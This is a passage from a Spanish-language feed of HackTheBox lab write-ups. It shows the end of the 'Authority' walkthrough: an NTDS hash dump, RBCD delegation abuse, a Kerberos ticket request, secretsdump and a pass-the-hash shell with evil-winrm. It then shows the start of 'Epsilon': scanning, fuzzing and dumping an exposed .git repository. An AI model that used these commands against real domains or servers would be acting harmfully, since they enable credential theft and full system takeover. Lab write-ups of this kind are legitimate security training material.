SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span>+] authority.htb<span class="se">\s</span>vc_ldap:lDaP_1n_th3_cle4r! <span class="o">(</span>Pwn3d!<span class="o">)</span>
SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span>+] Dumping the NTDS, this could take a <span class="k">while </span>so go grab a redbull...
SMB         10.10.11.222    445    AUTHORITY        Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
SMB         10.10.11.222    445    AUTHORITY        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.11.222    445    AUTHORITY        krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
SMB         10.10.11.222    445    AUTHORITY        svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::
SMB         10.10.11.222    445    AUTHORITY        AUTHORITY<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:9fe3805afb034743bed6e360c103115e:::
SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span>+] Dumped 5 NTDS hashes to /home/miguel/.cme/logs/AUTHORITY_10.10.11.222_2024-07-11_003637.ntds of which 4 were added to the database
</code></pre></div></div>

<ul>
  <li>Vamos a usar write_rbcd para darle permisos de <code class="language-plaintext highlighter-rouge">delegration</code> sobre el DC.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 /opt/PassTheCert/Python/passthecert.py <span class="nt">-action</span> write_rbcd <span class="nt">-delegate-to</span> <span class="s1">'AUTHORITY$'</span> <span class="nt">-delegate-from</span> <span class="s1">'miguel$'</span> <span class="nt">-crt</span> administrator.crt <span class="nt">-key</span> administrator.key <span class="nt">-domain</span> authority.htb <span class="nt">-dc-ip</span> 10.10.11.222
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Delegation rights modified successfully!
<span class="o">[</span><span class="k">*</span><span class="o">]</span> miguel<span class="nv">$ </span>can now impersonate <span class="nb">users </span>on AUTHORITY<span class="nv">$ </span>via S4U2Proxy
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Accounts allowed to act on behalf of other identity:
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     miguel<span class="nv">$ </span>     <span class="o">(</span>S-1-5-21-622327497-3269355298-2248959698-11602<span class="o">)</span>
</code></pre></div></div>

<blockquote>
  <p>Se refiere a la capacidad de un usuario, grupo o computadora para delegar su autoridad o permisos a otro usuario, grupo o computadora. Esto es especialmente relevante en entornos de red y dominio donde es común delegar ciertos permisos administrativos a usuarios o equipos específicos para realizar tareas específicas sin otorgar acceso completo.</p>
</blockquote>

<ul>
  <li>Ahora obtenemos el ticket.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-getST <span class="nt">-spn</span> <span class="s1">'cifs/AUTHORITY.AUTHORITY.HTB'</span> <span class="nt">-impersonate</span> Administrator <span class="s1">'authority.htb/miguel$:miguel123'</span>
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span>-] CCache file is not found. Skipping...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting TGT <span class="k">for </span>user
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Impersonating Administrator
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting S4U2self
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting S4U2Proxy
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>Administrator@cifs_AUTHORITY.AUTHORITY.HTB@AUTHORITY.HTB.ccache
</code></pre></div></div>

<ul>
  <li>Y ahora si obtenemos los hashes.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator@cifs_AUTHORITY.AUTHORITY.HTB@AUTHORITY.HTB.ccache impacket-secretsdump <span class="nt">-k</span> <span class="nt">-no-pass</span> authority.htb/administrator@authority.authority.htb <span class="nt">-just-dc-ntlm</span>
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::
AUTHORITY<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:42e6e4d7486c17cbc44fd23c758d39d1:::
miguel<span class="nv">$:</span>11602:aad3b435b51404eeaad3b435b51404ee:0ddc9e8df3c8843f75a918df65dda6ee:::
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cleaning up...
</code></pre></div></div>

<ul>
  <li>Ahora si ya nos pudimos conectar.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ evil-winrm <span class="nt">-i</span> authority.htb <span class="nt">-u</span> administrator <span class="nt">-H</span> 6961f422924da90a6928197429eea4ed

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>htb<span class="se">\a</span>dministrator
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>Recomiendo el writeup de mi amigo y compañero Soqui :) .</li>
</ul>

<iframe width="560" height="315" src="https://www.youtube.com/embed/5L0rHK3Ik54?si=AD5c9-hS52h_QD-0" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Epsilon (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/07/04/epsilon.html" rel="alternate" type="text/html" title="HackTheBox - Epsilon (medium)" /><published>2024-07-04T00:00:00-06:00</published><updated>2024-07-04T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/07/04/epsilon</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/07/04/epsilon.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/16ed7466c1f37757e15bd7e37668d243.png" />
</p>

<ul>
  <li>Epsilon is a medium difficulty Linux machine which exposes a Git repository on the webserver. AWS credentials are leaked in Git commits, which allows downloading the AWS Lambda function code. Secret key found in the source code can be used to forge a cookie to gain access to the web application. Foothold is obtained by exploiting the Server Side Template Injection vulnerability in the application feature. Abusing the tar symlink in a cronjob gives root access.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80,5000 10.10.11.134 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-07-04 18:13 CST
Nmap scan report <span class="k">for </span>10.10.11.134
Host is up <span class="o">(</span>0.10s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span class="o">(</span>RSA<span class="o">)</span>
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http    Apache httpd 2.4.41
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
| http-git:
|   10.10.11.134:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository<span class="p">;</span> edit this file <span class="s1">'description'</span> to name the...
|_    Last commit message: Updating Tracking API  <span class="c"># Please enter the commit message for...</span>
5000/tcp open  http    Werkzeug httpd 2.0.2 <span class="o">(</span>Python 3.8.10<span class="o">)</span>
|_http-title: Costume Shop
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
Service Info: Host: 127.0.1.1<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>En la pagina web principal obtenemos un código de estado <code class="language-plaintext highlighter-rouge">403</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> http://10.10.11.134
&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;403 Forbidden&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Forbidden&lt;/h1&gt;
&lt;p&gt;You don<span class="s1">'t have permission to access this resource.&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.4.41 (Ubuntu) Server at 10.10.11.134 Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
</span></code></pre></div></div>

<ul>
  <li>Si lo hacemos al puerto 5000 si nos responde.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> http://10.10.11.134:5000


&lt;<span class="o">!</span>DOCTYPE html&gt;
&lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span> <span class="o">&gt;</span>

&lt;<span class="nb">head</span><span class="o">&gt;</span>

  &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"UTF-8"</span><span class="o">&gt;</span>

  &lt;title&gt;Costume Shop&lt;/title&gt;
</code></pre></div></div>

<ul>
  <li>Como vemos no tenemos acceso.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/1.png" />
</p>

<ul>
  <li>En el puerto 5000 si podemos ver la web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/2.png" />
</p>

<ul>
  <li>Después de probar varias <code class="language-plaintext highlighter-rouge">querys</code> para ver si es vulnerable a una <code class="language-plaintext highlighter-rouge">SQL Injection</code> no tuve éxito, <code class="language-plaintext highlighter-rouge">Nmap</code> nos reporto un <code class="language-plaintext highlighter-rouge">.git</code> pero antes vamos a hacer <code class="language-plaintext highlighter-rouge">fuzzing</code> para ver si encontramos algo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ feroxbuster <span class="nt">-u</span> http://10.10.11.134:5000

 ___  ___  __   __     __      __         __   ___
|__  |__  |__<span class="o">)</span> |__<span class="o">)</span> | /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ | |  <span class="se">\ </span>|__
|    |___ |  <span class="se">\ </span>|  <span class="se">\ </span>| <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span>| |__/ |___
by Ben <span class="s2">"epi"</span> Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.134:5000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout <span class="o">(</span>secs<span class="o">)</span>        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ <span class="nb">true</span>
 🏁  HTTP methods          │ <span class="o">[</span>GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press <span class="o">[</span>ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        4l       34w      232c Auto-filtering found 404-like response and created new filter<span class="p">;</span> toggle off with <span class="nt">--dont-filter</span>
302      GET        4l       24w      208c http://10.10.11.134:5000/home <span class="o">=&gt;</span> http://10.10.11.134:5000/
200      GET      545l     2833w   217381c http://10.10.11.134:5000/static/img/costume.jpg
200      GET      205l      358w     3550c http://10.10.11.134:5000/
302      GET        4l       24w      208c http://10.10.11.134:5000/order <span class="o">=&gt;</span> http://10.10.11.134:5000/
200      GET      234l      454w     4288c http://10.10.11.134:5000/track
200      GET      565l     3002w   320823c http://10.10.11.134:5000/static/img/ico.png
<span class="o">[</span><span class="c">####################] - 3m     30006/30006   0s      found:6       errors:3</span>
<span class="o">[</span><span class="c">####################] - 3m     30000/30000   187/s   http://10.10.11.134:5000/ </span>
</code></pre></div></div>

<ul>
  <li>
    <p>Las rutas order y track son interesantes así que vamos a ir a track.</p>
  </li>
  <li>
    <p>Estamos como el Admin.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/3.png" />
</p>

<ul>
  <li>Si ponemos cualquier numero en el campo ID nos redirige al panel de login eso quiere decir que debemos estar logeados correctamente para acceder.</li>
</ul>

<h2 id="git-enumeration">Git Enumeration</h2>

<ul>
  <li>Como vimos el <code class="language-plaintext highlighter-rouge">.git</code> expuesto vamos a enumerarlo <a href="https://pypi.org/project/git-dumper/">https://pypi.org/project/git-dumper/</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ git-dumper http://10.10.11.134/.git <span class="nb">.</span>
<span class="o">[</span>-] Testing http://10.10.11.134/.git/HEAD <span class="o">[</span>200]
<span class="o">[</span>-] Testing http://10.10.11.134/.git/ <span class="o">[</span>403]
<span class="o">[</span>-] Fetching common files
<span class="o">[</span>-] Fetching http://10.10.11.134/.gitignore <span class="o">[</span>404]
<span class="o">[</span>-] http://10.10.11.134/.gitignore responded with status code 404
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/description <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/commit-msg.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/applypatch-msg.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/COMMIT_EDITMSG <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/post-commit.sample <span class="o">[</span>404]
<span class="o">[</span>-] http://10.10.11.134/.git/hooks/post-commit.sample responded with status code 404
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/post-receive.sample <span class="o">[</span>404]
<span class="o">[</span>-] http://10.10.11.134/.git/hooks/post-receive.sample responded with status code 404
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/pre-rebase.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/update.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/prepare-commit-msg.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/post-update.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/pre-receive.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/pre-applypatch.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/info/packs <span class="o">[</span>404]
<span class="o">[</span>-] http://10.10.11.134/.git/objects/info/packs responded with status code 404
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/pre-commit.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/hooks/pre-push.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/info/exclude <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/index <span class="o">[</span>200]
<span class="o">[</span>-] Finding refs/
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/FETCH_HEAD <span class="o">[</span>404]
<span class="o">[</span>-] http://10.10.11.134/.git/FETCH_HEAD responded with status code 404
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/ORIG_HEAD <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/HEAD <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/info/refs <span class="o">[</span>404]
<span class="o">[</span>-] http://10.10.11.134/.git/info/refs responded with status code 404
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/config <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/logs/refs/heads/master <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/logs/refs/remotes/origin/HEAD <span class="o">[</span>404]
<span class="o">[</span>-] http://10.10.11.134/.git/logs/refs/remotes/origin/HEAD responded with status code 404
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/logs/HEAD <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/logs/refs/stash <span class="o">[</span>404]
<span class="o">[</span>-] http://10.10.11.134/.git/logs/refs/stash responded with status code 404
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/packed-refs <span class="o">[</span>404]
<span class="o">[</span>-] http://10.10.11.134/.git/packed-refs responded with status code 404
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/refs/heads/master <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/refs/remotes/origin/HEAD <span class="o">[</span>404]
<span class="o">[</span>-] http://10.10.11.134/.git/refs/remotes/origin/HEAD responded with status code 404
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/refs/remotes/origin/master <span class="o">[</span>404]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/refs/stash <span class="o">[</span>404]
<span class="o">[</span>-] http://10.10.11.134/.git/refs/stash responded with status code 404
<span class="o">[</span>-] http://10.10.11.134/.git/refs/remotes/origin/master responded with status code 404
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/refs/wip/wtree/refs/heads/master <span class="o">[</span>404]
<span class="o">[</span>-] http://10.10.11.134/.git/refs/wip/wtree/refs/heads/master responded with status code 404
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/refs/wip/index/refs/heads/master <span class="o">[</span>404]
<span class="o">[</span>-] http://10.10.11.134/.git/refs/wip/index/refs/heads/master responded with status code 404
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/logs/refs/remotes/origin/master <span class="o">[</span>404]
<span class="o">[</span>-] http://10.10.11.134/.git/logs/refs/remotes/origin/master responded with status code 404
<span class="o">[</span>-] Finding packs
<span class="o">[</span>-] Finding objects
<span class="o">[</span>-] Fetching objects
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/c6/22771686bd74c16ece91193d29f85b5f9ffa91 <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/b1/0dd06d56ac760efbbb5d254ea43bf9beb56d2d <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/df/dfa17ca5701b1dca5069b6c3f705a038f4361e <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/c5/1441640fd25e9fba42725147595b5918eba0f1 <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/5c/52105750831385d4756111e1103957ac599d02 <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/8d/3b52e153c7d5380b183bbbb51f5d4020944630 <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/ce/401ccecf421ff19bf43fafe8a60a0d0f0682d0 <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/00/00000000000000000000000000000000000000 <span class="o">[</span>404]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/7c/f92a7a09e523c1c667d13847c9ba22464412f3 <span class="o">[</span>200]
<span class="o">[</span>-] http://10.10.11.134/.git/objects/00/00000000000000000000000000000000000000 responded with status code 404
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/65/b80f62da28254f67f0bea392057fd7d2330e2d <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/cf/489a3776d2bf87ac32de4579e852a4dc116ce8 <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/ab/07f7cdc7f410b8c8f848ee5674ec550ecb61ca <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/b5/f4c99c772eeb629e53d284275458d75ed9a010 <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/54/5f6fe2204336c1ea21720cbaa47572eb566e34 <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://10.10.11.134/.git/objects/fe/d7ab97cf361914f688f0e4f2d3adfafd1d7dca <span class="o">[</span>200]
<span class="o">[</span>-] Running git checkout <span class="nb">.</span>
</code></pre></div></div>

<ul>
  <li>Existe otra herramienta que se llama GitHack <a href="https://github.com/lijiejie/GitHack/tree/master">https://github.com/lijiejie/GitHack/tree/master</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ pip3 <span class="nb">install </span>GitHack
Defaulting to user installation because normal site-packages is not writeable
Collecting GitHack
  Downloading githack-0.0.4.post1-py3-none-any.whl.metadata <span class="o">(</span>2.0 kB<span class="o">)</span>
Downloading githack-0.0.4.post1-py3-none-any.whl <span class="o">(</span>54 kB<span class="o">)</span>
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 54.2/54.2 kB 579.0 kB/s eta 0:00:00
Installing collected packages: GitHack
Successfully installed GitHack-0.0.4.post1
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ githack http://10.10.11.134/.git/
</code></pre></div></div>

<ul>
  <li>Tenemos el proyecto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">ls</span> <span class="nt">-la</span>
total 20
drwxr-xr-x 3 miguel miguel 4096 Jul  4 18:31 <span class="nb">.</span>
drwxr-xr-x 6 miguel miguel 4096 Jul  4 18:09 ..
drwxr-xr-x 7 miguel miguel 4096 Jul  4 18:31 .git
<span class="nt">-rw-r--r--</span> 1 miguel miguel 1670 Jul  4 18:31 server.py
<span class="nt">-rw-r--r--</span> 1 miguel miguel 1099 Jul  4 18:31 track_api_CR_148.py
</code></pre></div></div>

<ul>
  <li>Este es el código en Python3 donde corre el puerto <code class="language-plaintext highlighter-rouge">5000</code>.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="n">jwt</span>
<span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
<span class="n">secret</span> <span class="o">=</span> <span class="sh">'</span><span class="s">&lt;secret_key&gt;</span><span class="sh">'</span>

<span class="k">def</span> <span class="nf">verify_jwt</span><span class="p">(</span><span class="n">token</span><span class="p">,</span><span class="n">key</span><span class="p">):</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="n">username</span><span class="o">=</span><span class="n">jwt</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span><span class="n">key</span><span class="p">,</span><span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">HS256</span><span class="sh">'</span><span class="p">,])[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span>
		<span class="k">if</span> <span class="n">username</span><span class="p">:</span>
			<span class="k">return</span> <span class="bp">True</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="k">return</span> <span class="bp">False</span>
	<span class="k">except</span><span class="p">:</span>
		<span class="k">return</span> <span class="bp">False</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
	<span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span><span class="o">==</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">:</span>
		<span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span><span class="o">==</span><span class="sh">"</span><span class="s">admin</span><span class="sh">"</span> <span class="ow">and</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">]</span><span class="o">==</span><span class="sh">"</span><span class="s">admin</span><span class="sh">"</span><span class="p">:</span>
			<span class="n">res</span> <span class="o">=</span> <span class="nf">make_response</span><span class="p">()</span>
			<span class="n">username</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span>
			<span class="n">token</span><span class="o">=</span><span class="n">jwt</span><span class="p">.</span><span class="nf">encode</span><span class="p">({</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">admin</span><span class="sh">"</span><span class="p">},</span><span class="n">secret</span><span class="p">,</span><span class="n">algorithm</span><span class="o">=</span><span class="sh">"</span><span class="s">HS256</span><span class="sh">"</span><span class="p">)</span>
			<span class="n">res</span><span class="p">.</span><span class="nf">set_cookie</span><span class="p">(</span><span class="sh">"</span><span class="s">auth</span><span class="sh">"</span><span class="p">,</span><span class="n">token</span><span class="p">)</span>
			<span class="n">res</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="sh">'</span><span class="s">location</span><span class="sh">'</span><span class="p">]</span><span class="o">=</span><span class="sh">'</span><span class="s">/home</span><span class="sh">'</span>
			<span class="k">return</span> <span class="n">res</span><span class="p">,</span><span class="mi">302</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">index.html</span><span class="sh">'</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">index.html</span><span class="sh">'</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/home</span><span class="sh">"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
	<span class="k">if</span> <span class="nf">verify_jwt</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">auth</span><span class="sh">'</span><span class="p">),</span><span class="n">secret</span><span class="p">):</span>
		<span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">home.html</span><span class="sh">'</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">,</span><span class="n">code</span><span class="o">=</span><span class="mi">302</span><span class="p">)</span>

